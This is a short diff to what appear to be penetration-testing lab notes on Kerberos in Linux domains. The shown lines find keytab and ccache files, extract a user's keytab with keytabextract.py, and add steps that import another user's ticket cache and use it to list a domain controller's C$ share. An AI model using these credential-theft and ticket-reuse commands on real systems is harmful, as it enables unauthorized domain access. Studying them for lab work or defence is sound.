@@ -350,7 +350,7 @@ cat /etc/nsswitch.conf | grep -i "sss\|winbind\|ldap"
 
 ### Finding Kerberos tickets in Linux
 
-#### Keytab file
+#### Find Keytab file
 
 Keytab file located by default at `/etc/krb5.keytab`.
 
@@ -365,7 +365,7 @@ find / -name *keytab* -ls 2>/dev/null
 crontab -l
 ```
 
-#### ccache files
+#### Find ccache files
 
 ```bash
 # Reviewing environment variables for ccache files
@@ -404,4 +404,15 @@ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
 ```
 
 ## Abusing KeyTab ccache
+
+### Importing the ccache file into our current session
+
+```bash
+cp /tmp/krb5cc_647401106_I8I133 .
+export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+klist
+
+# check smb access
+smbclient //dc01/C$ -k -c ls -no-pass
+```
 
